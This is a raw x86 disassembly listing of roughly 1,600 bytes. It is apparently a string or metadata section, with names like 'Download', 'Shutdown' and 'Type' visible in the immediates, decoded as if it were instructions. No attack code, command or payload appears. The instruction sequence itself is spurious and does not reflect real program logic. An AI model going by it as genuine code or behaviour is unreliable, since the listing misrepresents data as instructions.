  40ac89:	je     0x40acf3
  40ac8b:	push   edx
  40ac8c:	outs   dx,DWORD PTR ds:[esi]
  40ac8d:	outs   dx,DWORD PTR ds:[esi]
  40ac8e:	je     0x40acf5
  40ac90:	add    BYTE PTR fs:[ebx+0x70],dl
  40ac94:	ins    BYTE PTR es:[edi],dx
  40ac95:	imul   esi,DWORD PTR [eax+eax*1+0x54],0x6d6972
  40ac9d:	inc    ecx
  40ac9e:	jb     0x40ad07
  40aca0:	jne    0x40ad0f
  40aca2:	outs   dx,BYTE PTR gs:[esi]
  40aca4:	je     0x40aceb
  40aca6:	js     0x40ad0b
  40aca8:	gs jo  0x40ad1f
  40acab:	imul   ebp,DWORD PTR [edi+0x6e],0x656c4300
  40acb2:	popa   
  40acb3:	jb     0x40acb5
  40acb5:	inc    edi
  40acb6:	gs je  0x40acfa
  40acb9:	jae    0x40ad2e
  40acbb:	gs ins DWORD PTR es:[edi],dx
  40acbd:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  40acc1:	popa   
  40acc2:	ins    DWORD PTR es:[edi],dx
  40acc3:	add    BYTE PTR gs:[eax+0x6f],cl
  40acc7:	jae    0x40ad3d
  40acc9:	imul   ebp,DWORD PTR [esi+0x67],0x69766e45
  40acd0:	jb     0x40ad41
  40acd2:	outs   dx,BYTE PTR ds:[esi]
  40acd3:	ins    DWORD PTR es:[edi],dx
  40acd4:	outs   dx,BYTE PTR gs:[esi]
  40acd6:	je     0x40acd8
  40acd8:	push   edx
  40acd9:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x624f7265
  40ace2:	push   0x65
  40ace4:	arpl   WORD PTR [eax+eax*1+0x55],si
  40ace8:	outs   dx,BYTE PTR ds:[esi]
  40ace9:	jb     0x40ad50
  40aceb:	imul   esi,DWORD PTR [bp+di+0x74],0x624f7265
  40acf3:	push   0x65
  40acf5:	arpl   WORD PTR [eax+eax*1+0x49],si
  40acf9:	inc    ebp
  40acfa:	jno    0x40ad71
  40acfc:	popa   
  40acfd:	ins    BYTE PTR es:[edi],dx
  40acfe:	imul   esi,DWORD PTR [ecx+edi*2+0x43],0x61706d6f
  40ad06:	jb     0x40ad6d
  40ad08:	jb     0x40ad0a
  40ad0a:	inc    ecx
  40ad0b:	jb     0x40ad74
  40ad0d:	jne    0x40ad7c
  40ad0f:	outs   dx,BYTE PTR gs:[esi]
  40ad11:	je     0x40ad61
  40ad13:	jne    0x40ad81
  40ad15:	ins    BYTE PTR es:[edi],dx
  40ad16:	inc    ebp
  40ad17:	js     0x40ad7c
  40ad19:	gs jo  0x40ad90
  40ad1c:	imul   ebp,DWORD PTR [edi+0x6e],0x726f5300
  40ad23:	je     0x40ad25
  40ad25:	push   esp
  40ad26:	outs   dx,DWORD PTR ds:[esi]
  40ad27:	inc    ecx
  40ad28:	jb     0x40ad9c
  40ad2a:	popa   
  40ad2b:	jns    0x40ad2d
  40ad2d:	inc    edi
  40ad2e:	gs je  0x40ad81
  40ad31:	popa   
  40ad32:	je     0x40ad9c
  40ad34:	push   esp
  40ad35:	outs   dx,DWORD PTR ds:[esi]
  40ad36:	inc    esp
  40ad37:	outs   dx,DWORD PTR ds:[esi]
  40ad38:	je     0x40ad88
  40ad3a:	gs je  0x40ad83
  40ad3d:	jb     0x40ada0
  40ad3f:	ins    DWORD PTR es:[edi],dx
  40ad40:	gs ja  0x40adb2
  40ad43:	jb     0x40adb0
  40ad45:	push   edx
  40ad46:	gs data16 gs jb 0x40adb0
  40ad4b:	outs   dx,BYTE PTR ds:[esi]
  40ad4c:	arpl   WORD PTR [ebp+0x41],sp
  40ad4f:	jae    0x40adc4
  40ad51:	gs ins DWORD PTR es:[edi],dx
  40ad53:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  40ad57:	jae    0x40ad59
  40ad59:	inc    esp
  40ad5a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40ad61:	jns    0x40ad63
  40ad63:	push   ebx
  40ad64:	jns    0x40add9
  40ad66:	je     0x40adcd
  40ad68:	ins    DWORD PTR es:[edi],dx
  40ad69:	cs push esp
  40ad6b:	gs js  0x40ade2
  40ad6e:	add    BYTE PTR [ebx+0x74],dl
  40ad71:	jb     0x40addc
  40ad73:	outs   dx,BYTE PTR ds:[esi]
  40ad74:	addr16 inc edx
  40ad76:	jne    0x40ade1
  40ad78:	ins    BYTE PTR es:[edi],dx
  40ad79:	fs gs jb 0x40ad7d
  40ad7d:	inc    ecx
  40ad7e:	jo     0x40adf0
  40ad80:	outs   dx,BYTE PTR gs:[esi]
  40ad82:	add    BYTE PTR fs:[edi+ebp*2+0x53],dl
  40ad87:	je     0x40adfb
  40ad89:	imul   ebp,DWORD PTR [esi+0x67],0x646e4900
  40ad90:	gs js  0x40ade2
  40ad93:	data16 add BYTE PTR [ebx+0x75],dl
  40ad97:	bound  esi,QWORD PTR [ebx+0x74]
  40ad9a:	jb     0x40ae05
  40ad9c:	outs   dx,BYTE PTR ds:[esi]
  40ad9d:	add    BYTE PTR [bx+si+0x6d],bl
  40ada1:	ins    BYTE PTR es:[edi],dx
  40ada2:	push   esp
  40ada3:	gs js  0x40ae1a
  40ada6:	push   edx
  40ada7:	gs popa 
  40ada9:	fs gs jb 0x40adad
  40adad:	pop    eax
  40adae:	ins    DWORD PTR es:[edi],dx
  40adaf:	ins    BYTE PTR es:[edi],dx
  40adb0:	push   edx
  40adb1:	gs popa 
  40adb3:	fs gs jb 0x40adb7
  40adb7:	pop    eax
  40adb8:	ins    DWORD PTR es:[edi],dx
  40adb9:	ins    BYTE PTR es:[edi],dx
  40adba:	dec    esi
  40adbb:	outs   dx,DWORD PTR ds:[esi]
  40adbc:	fs gs push esp
  40adbf:	jns    0x40ae31
  40adc1:	add    BYTE PTR gs:[edi+0x65],ah
  40adc5:	je     0x40ae26
  40adc7:	dec    esi
  40adc8:	outs   dx,DWORD PTR ds:[esi]
  40adc9:	fs gs push esp
  40adcc:	jns    0x40ae3e
  40adce:	add    BYTE PTR gs:[ebp+0x6f],cl
  40add2:	jbe    0x40ae39
  40add4:	push   esp
  40add5:	outs   dx,DWORD PTR ds:[esi]
  40add6:	inc    esi
  40add7:	imul   esi,DWORD PTR [edx+0x73],0x74744174
  40adde:	jb     0x40ae49
  40ade0:	bound  esi,QWORD PTR [ebp+0x74]
  40ade3:	add    BYTE PTR gs:[ebp+0x6f],cl
  40ade7:	jbe    0x40ae4e
  40ade9:	push   esp
  40adea:	outs   dx,DWORD PTR ds:[esi]
  40adeb:	dec    esi
  40adec:	gs js  0x40ae63
  40adef:	inc    ecx
  40adf0:	je     0x40ae66
  40adf2:	jb     0x40ae5d
  40adf4:	bound  esi,QWORD PTR [ebp+0x74]
  40adf7:	add    BYTE PTR gs:[ebp+0x6f],cl
  40adfb:	jbe    0x40ae62
  40adfd:	push   esp
  40adfe:	outs   dx,DWORD PTR ds:[esi]
  40adff:	inc    ebp
  40ae00:	ins    BYTE PTR es:[edi],dx
  40ae01:	gs ins DWORD PTR es:[edi],dx
  40ae03:	outs   dx,BYTE PTR gs:[esi]
  40ae05:	je     0x40ae07
  40ae07:	push   edx
  40ae08:	gs popa 
  40ae0a:	add    BYTE PTR fs:[ebx+0x79],dl
  40ae0e:	jae    0x40ae84
  40ae10:	gs ins DWORD PTR es:[edi],dx
  40ae12:	cs inc ebx
  40ae14:	outs   dx,DWORD PTR ds:[esi]
  40ae15:	ins    BYTE PTR es:[edi],dx
  40ae16:	ins    BYTE PTR es:[edi],dx
  40ae17:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40ae1c:	outs   dx,BYTE PTR ds:[esi]
  40ae1d:	jae    0x40ae4d
  40ae1f:	push   ebx
  40ae20:	jo     0x40ae87
  40ae22:	arpl   WORD PTR [ecx+0x61],bp
  40ae25:	ins    BYTE PTR es:[edi],dx
  40ae26:	imul   edi,DWORD PTR [edx+0x65],0x74530064
  40ae2d:	jb     0x40ae98
  40ae2f:	outs   dx,BYTE PTR ds:[esi]
  40ae30:	addr16 inc esp
  40ae32:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40ae39:	jb     0x40aeb4
  40ae3b:	add    BYTE PTR [edx+esi*2+0x79],dl
  40ae3f:	push   eax
  40ae40:	popa   
  40ae41:	jb     0x40aeb6
  40ae43:	add    BYTE PTR gs:[eax+0x6d],bl
  40ae47:	ins    BYTE PTR es:[edi],dx
  40ae48:	inc    ebp
  40ae49:	js     0x40aeae
  40ae4b:	gs jo  0x40aec2
  40ae4e:	imul   ebp,DWORD PTR [edi+0x6e],0x726f4600
  40ae55:	ins    DWORD PTR es:[edi],dx
  40ae56:	popa   
  40ae57:	je     0x40ae59
  40ae59:	push   ebx
  40ae5a:	gs jb  0x40aed3
  40ae5d:	imul   esp,DWORD PTR [ebx+0x65],0x61686542
  40ae64:	jbe    0x40aecf
  40ae66:	outs   dx,DWORD PTR ds:[esi]
  40ae67:	jb     0x40aeaa
  40ae69:	je     0x40aedf
  40ae6b:	jb     0x40aed6
  40ae6d:	bound  esi,QWORD PTR [ebp+0x74]
  40ae70:	add    BYTE PTR gs:[edi+0x65],al
  40ae74:	je     0x40aeb9
  40ae76:	popa   
  40ae77:	ins    BYTE PTR es:[edi],dx
  40ae78:	ins    BYTE PTR es:[edi],dx
  40ae79:	bound  esp,QWORD PTR [ecx+0x63]
  40ae7c:	imul   eax,DWORD PTR [ebx+0x68],0x61
  40ae80:	outs   dx,BYTE PTR ds:[esi]
  40ae81:	outs   dx,BYTE PTR ds:[esi]
  40ae82:	gs ins BYTE PTR es:[edi],dx
  40ae84:	add    BYTE PTR [ebx+0x79],dl
  40ae87:	jae    0x40aefd
  40ae89:	gs ins DWORD PTR es:[edi],dx
  40ae8b:	cs push edx
  40ae8d:	jne    0x40aefd
  40ae8f:	je     0x40aefa
  40ae91:	ins    DWORD PTR es:[edi],dx
  40ae92:	gs cs push edx
  40ae95:	gs ins DWORD PTR es:[edi],dx
  40ae97:	outs   dx,DWORD PTR ds:[esi]
  40ae98:	je     0x40af03
  40ae9a:	outs   dx,BYTE PTR ds:[esi]
  40ae9b:	add    BYTE PTR [bp+si+0x65],dl
  40ae9f:	ins    DWORD PTR es:[edi],dx
  40aea0:	outs   dx,DWORD PTR ds:[esi]
  40aea1:	je     0x40af0c
  40aea3:	outs   dx,BYTE PTR ds:[esi]
  40aea4:	addr16 push ebx
  40aea6:	gs jb  0x40af1f
  40aea9:	imul   esp,DWORD PTR [ebx+0x65],0x65470073
  40aeb0:	je     0x40aefe
  40aeb2:	imul   esp,DWORD PTR [esi+0x65],0x656d6974
  40aeb9:	push   ebx
  40aeba:	gs jb  0x40af33
  40aebd:	imul   esp,DWORD PTR [ebx+0x65],0x434700
  40aec4:	push   ebx
  40aec5:	jne    0x40af37
  40aec7:	jo     0x40af3b
  40aec9:	gs jae 0x40af3f
  40aecc:	inc    esi
  40aecd:	imul   ebp,DWORD PTR [esi+0x61],0x657a696c
  40aed4:	add    BYTE PTR [edx+0x75],al
  40aed7:	imul   ebp,DWORD PTR [esp+eiz*2+0x4d],0x67616e61
  40aedf:	gs jb  0x40af2a
  40aee2:	outs   dx,DWORD PTR ds:[esi]
  40aee3:	jae    0x40af59
  40aee5:	push   ebp
  40aee6:	outs   dx,BYTE PTR ds:[esi]
  40aee7:	ins    BYTE PTR es:[edi],dx
  40aee8:	outs   dx,DWORD PTR ds:[esi]
  40aee9:	popa   
  40aeea:	fs inc ebp
  40aeec:	jbe    0x40af53
  40aeee:	outs   dx,BYTE PTR ds:[esi]
  40aeef:	je     0x40af39
  40aef1:	popa   
  40aef2:	outs   dx,BYTE PTR ds:[esi]
  40aef3:	fs ins BYTE PTR es:[edi],dx
  40aef5:	gs jb  0x40aef8
  40aef8:	jb     0x40af5f
  40aefa:	ins    DWORD PTR es:[edi],dx
  40aefb:	outs   dx,DWORD PTR ds:[esi]
  40aefc:	jbe    0x40af63
  40aefe:	pop    edi
  40aeff:	inc    ecx
  40af00:	jo     0x40af72
  40af02:	inc    esp
  40af03:	outs   dx,DWORD PTR ds:[esi]
  40af04:	ins    DWORD PTR es:[edi],dx
  40af05:	popa   
  40af06:	imul   ebp,DWORD PTR [esi+0x55],0x616f6c6e
  40af0d:	fs gs add BYTE PTR fs:[edx+0x65],dh
  40af13:	ins    DWORD PTR es:[edi],dx
  40af14:	outs   dx,DWORD PTR ds:[esi]
  40af15:	jbe    0x40af7c
  40af17:	pop    edi
  40af18:	inc    ecx
  40af19:	jo     0x40af8b
  40af1b:	inc    esp
  40af1c:	outs   dx,DWORD PTR ds:[esi]
  40af1d:	ins    DWORD PTR es:[edi],dx
  40af1e:	popa   
  40af1f:	imul   ebp,DWORD PTR [esi+0x53],0x64747568
  40af26:	outs   dx,DWORD PTR ds:[esi]
  40af27:	ja     0x40af97
  40af29:	add    BYTE PTR [edx+0x65],dh
  40af2c:	ins    DWORD PTR es:[edi],dx
  40af2d:	outs   dx,DWORD PTR ds:[esi]
  40af2e:	jbe    0x40af95
  40af30:	pop    edi
  40af31:	inc    ecx
  40af32:	jo     0x40afa4
  40af34:	inc    esp
  40af35:	outs   dx,DWORD PTR ds:[esi]
  40af36:	ins    DWORD PTR es:[edi],dx
  40af37:	popa   
  40af38:	imul   ebp,DWORD PTR [esi+0x53],0x74726174
  40af3f:	gs add BYTE PTR fs:[ebp+0x6e],dl
  40af44:	jb     0x40afab
  40af46:	imul   esi,DWORD PTR [bp+di+0x74],0x43007265
  40af4e:	ins    BYTE PTR es:[edi],dx
  40af4f:	imul   esp,DWORD PTR [ebp+0x6e],0x69754274
  40af56:	ins    BYTE PTR es:[edi],dx
  40af57:	fs dec ebp
  40af59:	popa   
  40af5a:	outs   dx,BYTE PTR ds:[esi]
  40af5b:	popa   
  40af5c:	addr16 gs jb 0x40afb0
  40af60:	popa   
  40af61:	jb     0x40afc4
  40af63:	ins    DWORD PTR es:[edi],dx
  40af64:	gs je  0x40afcc
  40af67:	jb     0x40af69
  40af69:	push   eax
  40af6a:	jb     0x40afd1
  40af6c:	arpl   WORD PTR [edi+0x6d],bp
  40af6f:	jo     0x40afda
  40af71:	ins    BYTE PTR es:[edi],dx
  40af72:	popa   
  40af73:	je     0x40afde
  40af75:	outs   dx,DWORD PTR ds:[esi]
  40af76:	outs   dx,BYTE PTR ds:[esi]
  40af77:	inc    esi
  40af78:	ins    BYTE PTR es:[edi],dx
  40af79:	popa   
  40af7a:	addr16 jae 0x40af7d
  40af7d:	jae    0x40afe4
  40af7f:	je     0x40afe0
  40af81:	push   eax
  40af82:	jb     0x40afe9
  40af84:	arpl   WORD PTR [edi+0x6d],bp
  40af87:	jo     0x40aff2
  40af89:	ins    BYTE PTR es:[edi],dx
  40af8a:	popa   
  40af8b:	je     0x40aff6
  40af8d:	outs   dx,DWORD PTR ds:[esi]
  40af8e:	outs   dx,BYTE PTR ds:[esi]
  40af8f:	inc    esi
  40af90:	ins    BYTE PTR es:[edi],dx
  40af91:	popa   
  40af92:	addr16 jae 0x40af95
  40af95:	jae    0x40affc
  40af97:	je     0x40aff8
  40af99:	push   ebx
  40af9a:	je     0x40b00e
  40af9c:	outs   dx,DWORD PTR ds:[esi]
  40af9d:	outs   dx,BYTE PTR ds:[esi]
  40af9e:	addr16 dec esi
  40afa0:	popa   
  40afa1:	ins    DWORD PTR es:[edi],dx
  40afa2:	gs dec ebx
  40afa4:	gs jns 0x40afed
  40afa7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5f746573
  40afaf:	push   ebx
  40afb0:	je     0x40b024
  40afb2:	outs   dx,DWORD PTR ds:[esi]
  40afb3:	outs   dx,BYTE PTR ds:[esi]
  40afb4:	addr16 dec esi
  40afb6:	popa   
  40afb7:	ins    DWORD PTR es:[edi],dx
  40afb8:	gs dec ebx
  40afba:	gs jns 0x40b000
  40afbd:	outs   dx,DWORD PTR ds:[esi]
  40afbe:	outs   dx,BYTE PTR ds:[esi]
  40afbf:	je     0x40b022
  40afc1:	imul   ebp,DWORD PTR [esi+0x65],0x79540072
  40afc8:	jo     0x40b02f
  40afca:	inc    esp
  40afcb:	gs jae 0x40b031
  40afce:	jb     0x40b039
  40afd0:	jo     0x40b046
  40afd2:	imul   ebp,DWORD PTR [edi+0x6e],0x766f7250
  40afd9:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x76726553
  40afe1:	imul   esp,DWORD PTR [ebx+0x65],0x74654700
  40afe8:	push   eax
  40afe9:	jb     0x40b05a
  40afeb:	jbe    0x40b056
  40afed:	fs gs jb 0x40aff1
  40aff1:	popa   
  40aff2:	fs fs pop edi
  40aff5:	inc    ecx
  40aff6:	jo     0x40b068
  40aff8:	inc    esp
  40aff9:	outs   dx,DWORD PTR ds:[esi]
  40affa:	ins    DWORD PTR es:[edi],dx
  40affb:	popa   
  40affc:	imul   ebp,DWORD PTR [esi+0x55],0x616f6c6e
  40b003:	fs gs add BYTE PTR fs:[ecx+0x64],ah
  40b009:	fs pop edi
  40b00b:	inc    ecx
  40b00c:	jo     0x40b07e
  40b00e:	inc    esp
  40b00f:	outs   dx,DWORD PTR ds:[esi]
  40b010:	ins    DWORD PTR es:[edi],dx
  40b011:	popa   
  40b012:	imul   ebp,DWORD PTR [esi+0x53],0x64747568
  40b019:	outs   dx,DWORD PTR ds:[esi]
  40b01a:	ja     0x40b08a
  40b01c:	add    BYTE PTR [ecx+0x64],ah
  40b01f:	fs pop edi
  40b021:	inc    ecx
  40b022:	jo     0x40b094
  40b024:	inc    esp
  40b025:	outs   dx,DWORD PTR ds:[esi]
  40b026:	ins    DWORD PTR es:[edi],dx
  40b027:	popa   
  40b028:	imul   ebp,DWORD PTR [esi+0x53],0x74726174
  40b02f:	gs add BYTE PTR fs:[ebx+0x42],al
  40b034:	dec    ebp
  40b035:	push   ebx
  40b036:	gs jb  0x40b0af
  40b039:	imul   esp,DWORD PTR [ebx+0x65],0x6c756146
  40b040:	je     0x40b042
  40b042:	addr16 gs je 0x40b0a5
  40b046:	dec    ebp
  40b047:	gs jae 0x40b0bd
  40b04a:	popa   
  40b04b:	add    BYTE PTR gs:[bp+di+0x65],dh
  40b050:	je     0x40b0b1
  40b052:	dec    ebp
  40b053:	gs jae 0x40b0c9
  40b056:	popa   
  40b057:	add    BYTE PTR gs:[bx+0x65],al
  40b05c:	je     0x40b0b2
  40b05e:	jns    0x40b0d0
  40b060:	add    BYTE PTR gs:[ebx+0x65],dh
  40b064:	je     0x40b0c5
  40b066:	inc    ebp
  40b067:	js     0x40b0cc
  40b069:	gs jo  0x40b0e0
  40b06c:	imul   ebp,DWORD PTR [edi+0x6e],0x65707954
  40b073:	add    BYTE PTR [esi+0x61],al
  40b076:	jne    0x40b0e4
  40b078:	je     0x40b0bf
  40b07a:	js     0x40b0df
  40b07c:	gs jo  0x40b0f3
  40b07f:	imul   ebp,DWORD PTR [edi+0x6e],0x67003160
  40b086:	gs je  0x40b0e8
  40b089:	dec    ecx
  40b08a:	jae    0x40b0d4
  40b08c:	outs   dx,DWORD PTR ds:[esi]
  40b08d:	jae    0x40b103
  40b08f:	inc    ebx
  40b090:	jb     0x40b0f7
  40b092:	popa   
  40b093:	je     0x40b0fa
  40b095:	add    BYTE PTR fs:[ebp+0x6e],dl
  40b099:	ins    BYTE PTR es:[edi],dx
  40b09a:	outs   dx,DWORD PTR ds:[esi]
  40b09b:	popa   
  40b09c:	add    BYTE PTR fs:[ecx+0x6e],cl
  40b0a0:	jbe    0x40b103
  40b0a2:	ins    BYTE PTR es:[edi],dx
  40b0a3:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  40b0ab:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  40b0b2:	jo     0x40b128
  40b0b4:	imul   ebp,DWORD PTR [edi+0x6e],0x6d654d00
  40b0bb:	bound  esp,QWORD PTR [ebp+0x72]
  40b0be:	dec    ecx
  40b0bf:	outs   dx,BYTE PTR ds:[esi]
  40b0c0:	outs   dx,WORD PTR ds:[esi]
  40b0c2:	add    BYTE PTR [ebp+0x6e],al
  40b0c5:	jne    0x40b134
  40b0c7:	gs jb  0x40b12b
  40b0ca:	je     0x40b131
  40b0cc:	inc    esi
  40b0cd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x73795300
  40b0d5:	je     0x40b13c
  40b0d7:	ins    DWORD PTR es:[edi],dx
  40b0d8:	cs inc ebx
  40b0da:	outs   dx,DWORD PTR ds:[esi]
  40b0db:	fs gs inc esp
  40b0de:	outs   dx,DWORD PTR ds:[esi]
  40b0df:	ins    DWORD PTR es:[edi],dx
  40b0e0:	add    BYTE PTR [ebx+0x6f],al
  40b0e3:	fs gs inc ebx
  40b0e6:	outs   dx,DWORD PTR ds:[esi]
  40b0e7:	ins    DWORD PTR es:[edi],dx
  40b0e8:	jo     0x40b153
  40b0ea:	ins    BYTE PTR es:[edi],dx
  40b0eb:	gs push ebp
  40b0ed:	outs   dx,BYTE PTR ds:[esi]
  40b0ee:	imul   esi,DWORD PTR [eax+eax*1+0x49],0x74636944
  40b0f6:	imul   ebp,DWORD PTR [edi+0x6e],0x797261
  40b0fd:	inc    edi
  40b0fe:	outs   dx,BYTE PTR gs:[esi]
  40b100:	gs jb  0x40b164
  40b103:	je     0x40b16a
  40b105:	inc    ebx
  40b106:	outs   dx,DWORD PTR ds:[esi]
  40b107:	fs gs inc ebx
  40b10a:	outs   dx,DWORD PTR ds:[esi]
  40b10b:	ins    DWORD PTR es:[edi],dx
  40b10c:	jo     0x40b177
  40b10e:	ins    BYTE PTR es:[edi],dx
  40b10f:	gs push ebp
  40b111:	outs   dx,BYTE PTR ds:[esi]
  40b112:	imul   esi,DWORD PTR [eax+eax*1+0x49],0x6c6c6f43
  40b11a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40b11f:	outs   dx,BYTE PTR ds:[esi]
  40b120:	add    BYTE PTR [ecx+0x44],cl
  40b123:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40b12a:	jb     0x40b1a5
  40b12c:	inc    ebp
  40b12d:	outs   dx,BYTE PTR ds:[esi]
  40b12e:	jne    0x40b19d
  40b130:	gs jb  0x40b194
  40b133:	je     0x40b1a4
  40b135:	jb     0x40b137
  40b137:	inc    esp
  40b138:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  40b13f:	jb     0x40b1ba
  40b141:	inc    ebp
  40b142:	outs   dx,BYTE PTR ds:[esi]
  40b143:	je     0x40b1b7
  40b145:	jns    0x40b147
  40b147:	dec    esp
  40b148:	imul   ebp,DWORD PTR [esi+0x65],0x67617250
  40b14f:	ins    DWORD PTR es:[edi],dx
  40b150:	popa   
  40b151:	inc    ebx
  40b152:	outs   dx,DWORD PTR ds:[esi]
  40b153:	fs gs dec ecx
  40b156:	outs   dx,BYTE PTR ds:[esi]
  40b157:	outs   dx,WORD PTR ds:[esi]
  40b159:	add    BYTE PTR [edi+0x65],ah
  40b15c:	je     0x40b1bd
  40b15e:	inc    ebx
  40b15f:	outs   dx,DWORD PTR ds:[esi]
  40b160:	fs gs dec esp
  40b163:	outs   dx,BYTE PTR gs:[esi]
  40b165:	addr16 je 0x40b1d0
  40b168:	add    BYTE PTR [ebx+0x65],dh
  40b16b:	je     0x40b1cc
  40b16d:	arpl   WORD PTR [edi+0x64],bp
  40b170:	gs dec esp
  40b172:	outs   dx,BYTE PTR gs:[esi]
  40b174:	addr16 je 0x40b1df
  40b177:	add    BYTE PTR [edi+0x65],ah
  40b17a:	je     0x40b1db
  40b17c:	dec    ecx
  40b17d:	jae    0x40b1c2
  40b17f:	outs   dx,DWORD PTR ds:[esi]
  40b180:	fs gs dec esi
  40b183:	jne    0x40b1ec
  40b185:	addr16 gs je 0x40b189
  40b189:	jae    0x40b1f0
  40b18b:	je     0x40b1ec
  40b18d:	imul   esi,DWORD PTR [ebx+0x43],0x4e65646f
  40b194:	jne    0x40b1fd
  40b196:	addr16 gs je 0x40b19a
  40b19a:	addr16 gs je 0x40b1fd
  40b19e:	dec    ebx
  40b19f:	gs jns 0x40b1a2
  40b1a2:	jae    0x40b209
  40b1a4:	je     0x40b205
  40b1a6:	imul   esp,DWORD PTR [ebp+0x79],0x0
  40b1aa:	addr16 gs je 0x40b20d
  40b1ae:	push   ebx
  40b1af:	je     0x40b212
  40b1b1:	jb     0x40b227
  40b1b3:	inc    ebx
  40b1b4:	outs   dx,DWORD PTR ds:[esi]
  40b1b5:	ins    BYTE PTR es:[edi],dx
  40b1b6:	jne    0x40b225
  40b1b8:	outs   dx,BYTE PTR ds:[esi]
  40b1b9:	add    BYTE PTR [ebx+0x65],dh
  40b1bc:	je     0x40b21d
  40b1be:	jae    0x40b234
  40b1c0:	popa   
  40b1c1:	jb     0x40b237
  40b1c3:	inc    ebx
  40b1c4:	outs   dx,DWORD PTR ds:[esi]
  40b1c5:	ins    BYTE PTR es:[edi],dx
  40b1c6:	jne    0x40b235
  40b1c8:	outs   dx,BYTE PTR ds:[esi]
  40b1c9:	add    BYTE PTR [edi+0x65],ah
  40b1cc:	je     0x40b22d
  40b1ce:	push   ebx
  40b1cf:	je     0x40b232
  40b1d1:	jb     0x40b247
  40b1d3:	inc    edi
  40b1d4:	outs   dx,BYTE PTR gs:[esi]
  40b1d6:	gs jb  0x40b23a
  40b1d9:	je     0x40b240
  40b1db:	fs inc ebx
  40b1dd:	outs   dx,DWORD PTR ds:[esi]
  40b1de:	ins    BYTE PTR es:[edi],dx
  40b1df:	jne    0x40b24e
  40b1e1:	outs   dx,BYTE PTR ds:[esi]
  40b1e2:	add    BYTE PTR [ebx+0x65],dh
  40b1e5:	je     0x40b246
  40b1e7:	jae    0x40b25d
  40b1e9:	popa   
  40b1ea:	jb     0x40b260
  40b1ec:	inc    edi
  40b1ed:	outs   dx,BYTE PTR gs:[esi]
  40b1ef:	gs jb  0x40b253
  40b1f2:	je     0x40b259
  40b1f4:	fs inc ebx
  40b1f6:	outs   dx,DWORD PTR ds:[esi]
  40b1f7:	ins    BYTE PTR es:[edi],dx
  40b1f8:	jne    0x40b267
  40b1fa:	outs   dx,BYTE PTR ds:[esi]
  40b1fb:	add    BYTE PTR [edi+0x65],ah
  40b1fe:	je     0x40b25f
  40b200:	push   ebx
  40b201:	je     0x40b264
  40b203:	jb     0x40b279
  40b205:	dec    esp
  40b206:	imul   ebp,DWORD PTR [esi+0x65],0x74657300
  40b20d:	pop    edi
  40b20e:	jae    0x40b284
  40b210:	popa   
  40b211:	jb     0x40b287
  40b213:	dec    esp
  40b214:	imul   ebp,DWORD PTR [esi+0x65],0x73795300
  40b21b:	je     0x40b282
  40b21d:	ins    DWORD PTR es:[edi],dx
  40b21e:	cs push edi
  40b220:	bound  ebp,QWORD PTR gs:[esi]
  40b223:	push   ebp
  40b224:	dec    ecx
  40b225:	add    BYTE PTR [edx+esi*2+0x69],dl
  40b229:	jo     0x40b297
  40b22b:	gs je  0x40b22e
  40b22e:	inc    esi
  40b22f:	imul   esi,DWORD PTR [edx+0x73],0x65730074
  40b236:	je     0x40b297
  40b238:	imul   si,WORD PTR [edx+0x73],0x74
  40b23e:	push   ebx
  40b23f:	arpl   WORD PTR gs:[edi+0x6e],bp
  40b243:	add    BYTE PTR fs:[ebx+0x65],dh
  40b247:	je     0x40b2a8
  40b249:	jae    0x40b2b0
  40b24b:	arpl   WORD PTR [edi+0x6e],bp
  40b24e:	add    BYTE PTR fs:[eax+ebp*2+0x69],dl
  40b253:	jb     0x40b2b9
  40b255:	add    BYTE PTR [ebx+0x65],dh
  40b258:	je     0x40b2b9
  40b25a:	je     0x40b2c4
  40b25c:	imul   esi,DWORD PTR [edx+0x64],0x73655200
  40b263:	gs je  0x40b266
  40b266:	addr16 gs je 0x40b2c9
  40b26a:	inc    ebx
  40b26b:	jne    0x40b2df
  40b26d:	jb     0x40b2d4
  40b26f:	outs   dx,BYTE PTR ds:[esi]
  40b270:	je     0x40b2b5
  40b272:	jne    0x40b2e0
  40b274:	je     0x40b2eb
  40b276:	jb     0x40b2dd
  40b278:	add    BYTE PTR [edx+0x69],al
  40b27b:	outs   dx,BYTE PTR ds:[esi]
  40b27c:	imul   ebp,DWORD PTR fs:[esi+0x67],0x67616c46
  40b284:	jae    0x40b286
  40b286:	inc    edx
  40b287:	imul   ebp,DWORD PTR [esi+0x64],0x49007265
  40b28e:	outs   dx,BYTE PTR ds:[esi]
  40b28f:	jbe    0x40b300
  40b291:	imul   esp,DWORD PTR [ebp+0x4d],0x65
  40b295:	ins    DWORD PTR es:[edi],dx
  40b296:	bound  esp,QWORD PTR [ebp+0x72]
  40b299:	add    BYTE PTR [ebx+0x72],al
  40b29c:	gs popa 
  40b29e:	je     0x40b305
  40b2a0:	dec    edi
  40b2a1:	bound  ebp,QWORD PTR [edx+0x65]
  40b2a4:	arpl   WORD PTR [eax+eax*1+0x73],si
  40b2a8:	gs je  0x40b30a
  40b2ab:	inc    esi
  40b2ac:	imul   ebp,DWORD PTR [ebp+eiz*2+0x6e],0x656d61
  40b2b4:	jae    0x40b31b
  40b2b6:	je     0x40b317
  40b2b8:	dec    esp
  40b2b9:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  40b2c0:	gs jb  0x40b2c3
  40b2c3:	dec    eax
  40b2c4:	je     0x40b33a
  40b2c6:	jo     0x40b30b
  40b2c8:	outs   dx,DWORD PTR ds:[esi]
  40b2c9:	ins    DWORD PTR es:[edi],dx
  40b2ca:	jo     0x40b335
  40b2cc:	ins    BYTE PTR es:[edi],dx
  40b2cd:	gs inc ebp
  40b2cf:	js     0x40b334
  40b2d1:	gs jo  0x40b348
  40b2d4:	imul   ebp,DWORD PTR [edi+0x6e],0x74744800
  40b2db:	jo     0x40b32d
  40b2dd:	popa   
